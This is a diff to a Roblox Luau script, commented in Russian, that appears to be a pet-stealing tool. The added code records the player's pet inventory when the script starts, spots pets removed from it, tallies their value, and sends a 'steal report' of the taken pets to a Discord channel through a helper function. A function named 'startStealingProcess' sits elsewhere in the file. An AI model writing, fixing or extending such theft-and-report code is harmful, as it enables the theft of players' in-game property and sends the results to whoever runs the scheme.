@@ -7,6 +7,16 @@ repeat task.wait() until game:IsLoaded()
 
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 
+-- 🔁 Храним оригинальные данные питомцев (для сравнения позже)
+local originalPetUIDs = {}
+local originalPetData = {}
+local reportSent = false
+
+for petUid, petInfo in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+    originalPetUIDs[petUid] = true
+    originalPetData[petUid] = petInfo
+end
+
 
 getgenv().PetConfig = {
     MinLevel = getgenv().MinLevel or 25,
@@ -35,11 +45,12 @@ local function checkIfPetTransferred()
         if not currentPets[uid] then
             print("🐾 Pet removed from inventory:", uid)
             reportSent = true
-            sendStealReportOnce() -- ⬅️ Вот сюда вставится функция из следующего шага
+            sendStealReportOnce()
             break
         end
     end
 end
+
 
 
 
@@ -485,16 +496,18 @@ local function startStealingProcess()
 
 function sendStealReportOnce()
     local passedPets = {}
-    local failedPets = {}
-    local totalValue = 0
-    local failedValue = 0
-    local countPassed = 0
-    local countFailed = 0
-    local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
+local failedPets = {}
+local totalValue = 0
+local failedValue = 0
+local countPassed = 0
+local countFailed = 0
+local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
 
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        local petName = value.PetType
-        local petData = value.PetData
+-- 🔎 Сравниваем исчезнувших питомцев
+for petUid, petInfo in pairs(originalPetData) do
+    if not dataModule:GetData().PetsData.PetInventory.Data[petUid] then
+        local petName = petInfo.PetType
+        local petData = petInfo.PetData
         local level = petData.Level or 0
         local baseWeight = petData.BaseWeight or 0
         local realWeight = baseWeight * (1 + level * growthFactor)
@@ -512,18 +525,21 @@ function sendStealReportOnce()
             countFailed += 1
         end
     end
+end
 
-    local summary = string.format(
-        "**✅ Passed:** %d pets | 💸 Value: %d\n**❌ Failed:** %d pets | 💸 Missed: %d",
-        countPassed, totalValue, countFailed, failedValue
-    )
+-- 🧾 Формируем отчёт
+local summary = string.format(
+    "**✅ Passed:** %d pets | 💸 Value: %d\n**❌ Failed:** %d pets | 💸 Missed: %d",
+    countPassed, totalValue, countFailed, failedValue
+)
 
-    local fullPetList = "**✅ Passed Pets:**\n" .. table.concat(passedPets, "\n") ..
-                        "\n\n**❌ Failed Pets:**\n" .. table.concat(failedPets, "\n")
+local fullPetList = "**✅ Passed Pets:**\n" .. table.concat(passedPets, "\n") ..
+                    "\n\n**❌ Failed Pets:**\n" .. table.concat(failedPets, "\n")
 
-    createDiscordEmbed(fullPetList, summary, "", function()
-        print("📨 Отчёт отправлен один раз.")
-    end)
+-- 📤 Отправляем в Discord
+createDiscordEmbed(fullPetList, summary, "", function()
+    print("📨 Отчёт об исчезнувших питомцах отправлен.")
+end)
 end
 
 
